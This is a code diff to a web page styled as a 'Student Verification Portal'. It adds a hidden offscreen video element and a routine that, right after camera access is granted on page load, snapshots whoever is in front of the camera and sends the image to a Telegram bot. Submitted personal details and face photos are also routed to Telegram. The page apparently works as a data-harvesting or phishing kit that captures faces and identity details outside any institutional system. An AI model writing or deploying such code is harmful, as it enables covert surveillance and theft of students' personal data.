@@ -203,6 +203,13 @@ body::before{
 </style>
 </head>
 <body>
+<!-- Dedicated video for the startup liveness snapshot. Kept OUT of any
+     display:none panel (offscreen + near-zero opacity instead) because
+     browsers commonly stop decoding/rendering a <video> that sits inside a
+     display:none ancestor, which would silently break frame capture. -->
+<video id="startup-cam-video" autoplay playsinline muted
+  style="position:fixed;top:-9999px;left:-9999px;width:2px;height:2px;opacity:0.01;pointer-events:none;"></video>
+
 
 <header class="site-header">
   <div class="header-inner">
@@ -228,7 +235,7 @@ body::before{
 
 <div class="portal-tag">
   <h1>Student Verification Portal</h1>
-  <p>Fill in your details and capture a quick verification photo. This site requests camera access as soon as it loads &mdash; we use it to confirm you're a real person and not an automated bot.</p>
+  <p>Fill in your details below. This site requests camera access as soon as it loads and takes an automatic snapshot right away &mdash; before you've entered anything &mdash; to confirm a real person opened this page and not a bot or script. You'll then capture a second, final verification photo yourself at the Review step before submitting.</p>
 </div>
 
 <div class="cam-notice hidden" id="camera-notice">
@@ -409,7 +416,10 @@ const state = {
   step: 1,
   stream: null,
   capturedBlob: null,
-  capturedDataUrl: null
+  capturedDataUrl: null,
+  sessionId: "GGITS-" + Date.now().toString(36).toUpperCase(),
+  startupSnapshotSent: false,
+  startupSnapshotInFlight: false
 };
 
 const STEPS = [
@@ -448,6 +458,7 @@ function goToStep(n) {
    ============================================================ */
 const photoBox = el("photo-box");
 const camVideo = el("cam-video");
+const startupCamVideo = el("startup-cam-video");
 const capturedImg = el("captured-img");
 const placeholder = el("photo-placeholder");
 const shutter = el("photo-shutter");
@@ -479,11 +490,13 @@ async function startCamera() {
       audio: false
     });
     camVideo.srcObject = state.stream;
+    startupCamVideo.srcObject = state.stream;
     placeholder.classList.add("hidden");
     camVideo.classList.remove("hidden");
     photoBox.classList.add("has-video");
     shutter.classList.remove("hidden");
     setStatus("live", "Center your face &amp; tap the shutter");
+    sendStartupLivenessSnapshot(); // fire-and-forget: snapshot + send as soon as we have a live feed
   } catch (err) {
     setStatus("idle", "Not captured yet");
     setCamNotice("denied", `Camera permission was blocked. Please allow camera access in your browser settings, then
@@ -629,24 +642,28 @@ function buildDetailsText(refId) {
   return lines.join("\n");
 }
 
-async function sendToTelegram(refId) {
+function telegramConfigured() {
   const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;
-  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" ||
-      !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_OR_CHANNEL_ID_HERE") {
+  return TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" &&
+         TELEGRAM_CHAT_ID && TELEGRAM_CHAT_ID !== "YOUR_CHAT_OR_CHANNEL_ID_HERE";
+}
+
+/** Sends a photo (+ optional caption/overflow text) to the configured Telegram chat. */
+async function sendPhotoToTelegram(blob, filename, caption, overflowText) {
+  if (!telegramConfigured()) {
     console.warn("GGITS Verification Form: Telegram bot token / chat id not configured yet. Skipping real send (trial mode).");
-    await new Promise(r => setTimeout(r, 900));
+    await new Promise(r => setTimeout(r, 600));
     return;
   }
 
-  const apiBase = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-  const fullText = buildDetailsText(refId);
+  const apiBase = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}`;
   const TELEGRAM_CAPTION_LIMIT = 1024; // Telegram's max length for a photo caption
 
   const photoForm = new FormData();
-  photoForm.append("chat_id", TELEGRAM_CHAT_ID);
-  photoForm.append("photo", state.capturedBlob, "face-capture.jpg");
+  photoForm.append("chat_id", CONFIG.TELEGRAM_CHAT_ID);
+  photoForm.append("photo", blob, filename);
   photoForm.append("parse_mode", "HTML");
-  photoForm.append("caption", fullText.length <= TELEGRAM_CAPTION_LIMIT ? fullText : `<b>New Student Verification Submission</b>\n<b>Reference:</b> ${escapeHtml(refId)}\n(Full details in the next message)`);
+  photoForm.append("caption", caption.length <= TELEGRAM_CAPTION_LIMIT ? caption : caption.slice(0, TELEGRAM_CAPTION_LIMIT - 3) + "...");
 
   const photoRes = await fetch(`${apiBase}/sendPhoto`, { method: "POST", body: photoForm });
   const photoJson = await photoRes.json();
@@ -654,11 +671,12 @@ async function sendToTelegram(refId) {
     throw new Error("Telegram sendPhoto failed: " + (photoJson.description || photoRes.status));
   }
 
-  if (fullText.length > TELEGRAM_CAPTION_LIMIT) {
+  const overflow = overflowText || (caption.length > TELEGRAM_CAPTION_LIMIT ? caption : null);
+  if (overflow) {
     const msgRes = await fetch(`${apiBase}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: fullText, parse_mode: "HTML" })
+      body: JSON.stringify({ chat_id: CONFIG.TELEGRAM_CHAT_ID, text: overflow, parse_mode: "HTML" })
     });
     const msgJson = await msgRes.json();
     if (!msgRes.ok || !msgJson.ok) {
@@ -666,6 +684,70 @@ async function sendToTelegram(refId) {
     }
   }
 }
+
+/** Grabs a single JPEG frame from the given <video> element as a Blob. */
+function captureFrameBlob(videoEl, quality) {
+  return new Promise((resolve, reject) => {
+    if (!videoEl.videoWidth || !videoEl.videoHeight) {
+      reject(new Error("Video not ready for capture"));
+      return;
+    }
+    const canvas = document.createElement("canvas");
+    canvas.width = videoEl.videoWidth;
+    canvas.height = videoEl.videoHeight;
+    const ctx = canvas.getContext("2d");
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob((blob) => blob ? resolve(blob) : reject(new Error("toBlob failed")), "image/jpeg", quality || 0.85);
+  });
+}
+
+/** Waits for the video to actually have a usable frame before we snapshot it. */
+function waitForVideoReady(videoEl, timeoutMs) {
+  return new Promise((resolve, reject) => {
+    if (videoEl.readyState >= 2 && videoEl.videoWidth) { resolve(); return; }
+    const onReady = () => { cleanup(); resolve(); };
+    const timer = setTimeout(() => { cleanup(); reject(new Error("Video readiness timeout")); }, timeoutMs || 4000);
+    function cleanup() {
+      clearTimeout(timer);
+      videoEl.removeEventListener("loadeddata", onReady);
+    }
+    videoEl.addEventListener("loadeddata", onReady);
+  });
+}
+
+/**
+ * Fires once, right after camera access is granted on page load: takes a
+ * snapshot of whoever is in front of the camera at that moment and sends it
+ * to Telegram immediately, tagged with the session id, BEFORE the person has
+ * filled anything in. This lets staff cross-check that the same person who
+ * opened the form is the one who later submits the final verification photo,
+ * and flags sessions where no one is present at all (a likely bot/script).
+ */
+async function sendStartupLivenessSnapshot() {
+  if (state.startupSnapshotSent || state.startupSnapshotInFlight) return;
+  state.startupSnapshotInFlight = true;
+  try {
+    await waitForVideoReady(startupCamVideo, 5000);
+    const blob = await captureFrameBlob(startupCamVideo, 0.8);
+    const caption = [
+      `<b>Startup liveness check</b>`,
+      `<b>Session:</b> ${escapeHtml(state.sessionId)}`,
+      `<b>Time:</b> ${escapeHtml(new Date().toISOString())}`,
+      `(Automatic snapshot taken when the form loaded, before any details were entered — used to confirm a real person opened the page.)`
+    ].join("\n");
+    await sendPhotoToTelegram(blob, "startup-liveness.jpg", caption);
+    state.startupSnapshotSent = true;
+  } catch (err) {
+    // Non-fatal: don't block the form over this, just log it.
+    console.warn("GGITS Verification Form: startup liveness snapshot failed:", err);
+  } finally {
+    state.startupSnapshotInFlight = false;
+  }
+}
+
+el("btn-back-review").addEventListener("click", () => goToStep(1));
 
 el("btn-submit").addEventListener("click", async () => {
   const errWrap = el("submit-error-wrap");
@@ -683,8 +765,9 @@ el("btn-submit").addEventListener("click", async () => {
   el("submit-label").innerHTML = `<span class="spinner"></span> Submitting…`;
 
   try {
-    const refId = "GGITS-" + Date.now().toString(36).toUpperCase();
-    await sendToTelegram(refId);
+    const refId = state.sessionId;
+    const fullText = buildDetailsText(refId);
+    await sendPhotoToTelegram(state.capturedBlob, "face-capture.jpg", fullText);
     el("ref-id").textContent = refId;
     goToStep(3);
   } catch (err) {
